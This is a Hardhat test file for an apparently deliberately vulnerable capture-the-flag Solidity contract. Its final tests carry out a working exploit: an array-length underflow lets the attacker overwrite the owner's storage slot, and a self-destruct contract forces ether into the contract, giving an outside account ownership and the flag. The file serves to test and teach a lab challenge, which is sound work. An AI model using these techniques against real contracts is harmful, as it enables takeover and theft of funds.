import { expect } from 'chai';
import { ethers } from 'hardhat';
import type { Contract } from 'ethers';
import type { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

describe('TotallySecureDapp', () => {
    let TotallySecureDapp;
    let totallySecureDapp: Contract;
    let owner: SignerWithAddress, addr1: SignerWithAddress;

    beforeEach(async () => {
        [owner, addr1] = await ethers.getSigners();
        TotallySecureDapp = await ethers.getContractFactory('TotallySecureDapp');
        totallySecureDapp = await TotallySecureDapp.deploy();
        await totallySecureDapp.deployed();
        await totallySecureDapp.initialize('id');
    });

    it('Should set the owner', async () => {
        expect(await totallySecureDapp._owner()).to.equal(owner.address);
    });

    it('Should not initialize again', async () => {
        await expect(totallySecureDapp.initialize('id')).to.be.revertedWith(
            'Initializable: contract is already initialized'
        );
    });

    it('Should add a new post', async () => {
        const title = 'title';
        const content = 'content';
        await expect(totallySecureDapp.addPost(title, content))
            .to.emit(totallySecureDapp, 'PostPublished')
            .withArgs(owner.address, 0);
        const post = await totallySecureDapp._posts(0);
        const author = await totallySecureDapp._authors(0);
        expect(post.title).to.equal(title);
        expect(post.content).to.equal(content);
        expect(author).to.equal(owner.address);
    });

    it('Should edit a post', async () => {
        const newTitle = 'new title';
        const newContent = 'new content';
        await totallySecureDapp.addPost('title', 'content');
        await expect(totallySecureDapp.editPost(0, newTitle, newContent))
            .to.emit(totallySecureDapp, 'PostEdited')
            .withArgs(owner.address, 0);
        const editedPost = await totallySecureDapp._posts(0);
        expect(editedPost.title).to.equal(newTitle);
        expect(editedPost.content).to.equal(newContent);
    });

    it('Should remove a post', async () => {
        await totallySecureDapp.addPost('title', 'content');
        expect(await totallySecureDapp.nPosts()).to.equal(1);
        await expect(totallySecureDapp.removePost(0))
            .to.emit(totallySecureDapp, 'PostRemoved')
            .withArgs(owner.address, 0);
        await totallySecureDapp.addPost('title 2', 'content 2');
        await totallySecureDapp.addPost('title 3', 'content 3');
        expect(await totallySecureDapp.nPosts()).to.equal(2);
        await expect(totallySecureDapp.removePost(0))
            .to.emit(totallySecureDapp, 'PostRemoved')
            .withArgs(owner.address, 0);
    });

    it('Should only allow admins', async () => {
        await expect(totallySecureDapp.captureFlag()).to.be.revertedWith('Balance too low');
        await expect(totallySecureDapp.connect(addr1).captureFlag()).to.be.revertedWith(
            'Caller is not the owner'
        );
    });

    it('Should reject payments', async () => {
        const { parseEther } = ethers.utils;
        expect(await owner.provider!.getBalance(totallySecureDapp.address)).to.equal(0);
        await expect(
            owner.sendTransaction({ to: totallySecureDapp.address, value: parseEther('1') })
        ).to.be.revertedWith('Contract does not accept payments');
        expect(await owner.provider!.getBalance(totallySecureDapp.address)).to.equal(0);
    });

    it('Should overwrite the owner admin', async () => {
        const { solidityKeccak256, hexZeroPad } = ethers.utils;
        const { BigNumber } = ethers;
        const ownerSlot = 2; // Slot of _owner in storage
        const authorsSlot = solidityKeccak256(['uint256'], [3]); // Slot of _authors in storage
        // Authors array index, acts as offset from 0th element of _authors to _owner
        // We overflow uint256 with the difference between 2^256 and 0th _authors element slot, then add the _owner slot
        const i = BigNumber.from(2).pow(256).sub(authorsSlot).add(ownerSlot);
        // Underflow the array length and make it wrap to 2^256 - 1 so we get access to all storage
        await totallySecureDapp.connect(addr1).removePost(0);
        // Ensure the underflow has worked
        expect(await totallySecureDapp.connect(addr1).nPosts()).to.equal(
            BigNumber.from(2).pow(256).sub(1)
        );
        // Overwrite _owner with our user address
        await totallySecureDapp.connect(addr1).editPost(i, 'title', 'content');
        // Verify the overwrite has succeeded
        expect(await totallySecureDapp._owner()).to.equal(addr1.address);
        expect(await owner.provider!.getStorageAt(totallySecureDapp.address, ownerSlot)).to.equal(
            hexZeroPad(addr1.address, 32).toLowerCase()
        );
        // Try to run the owner only function
        await expect(totallySecureDapp.connect(addr1).captureFlag()).to.not.be.revertedWith(
            'Caller is not the owner'
        );
    });

    it('Should take payment on attacker self-destruct', async () => {
        const { parseEther } = ethers.utils;
        const ethToSend = parseEther('1');
        const Attacker = await ethers.getContractFactory('Attacker');
        const attacker = await Attacker.deploy();
        await attacker.deployed();
        // TotallySecureDapp balance should be zero
        expect(await owner.provider!.getBalance(totallySecureDapp.address)).to.equal(0);
        // Send attacker ether and self-destruct, causing that ether to be sent to the TotallySecureDapp
        await attacker.attack(totallySecureDapp.address, { value: ethToSend });
        // TotallySecureDapp balance should now be 1
        expect(await owner.provider!.getBalance(totallySecureDapp.address)).to.equal(ethToSend);
    });

    it('Should capture the flag', async () => {
        const { solidityKeccak256, parseEther } = ethers.utils;
        const { BigNumber } = ethers;
        // First exploit - array length underflow - overwrite contract owner
        const i = BigNumber.from(2)
            .pow(256)
            .sub(solidityKeccak256(['uint256'], [3]))
            .add(2);
        await totallySecureDapp.connect(addr1).removePost(0);
        await totallySecureDapp.connect(addr1).editPost(i, '', '');
        // Second exploit - forcibly send ether to contract - gain access to captureFlag()
        const eth = parseEther('1');
        const Attacker = await ethers.getContractFactory('Attacker');
        const attacker = await Attacker.connect(addr1).deploy();
        await attacker.connect(addr1).deployed();
        await attacker.connect(addr1).attack(totallySecureDapp.address, { value: eth });
        // Capture the flag
        await expect(totallySecureDapp.connect(addr1).captureFlag())
            .to.not.be.revertedWith('Caller is not the owner')
            .and.to.not.be.revertedWith('Balance too low');
        expect(await totallySecureDapp.connect(addr1)._owner()).to.equal(addr1.address);
        expect(await totallySecureDapp.connect(addr1)._flagCaptured()).to.equal(true);
        expect(await addr1.provider!.getBalance(totallySecureDapp.address)).to.equal(eth);
    });
});
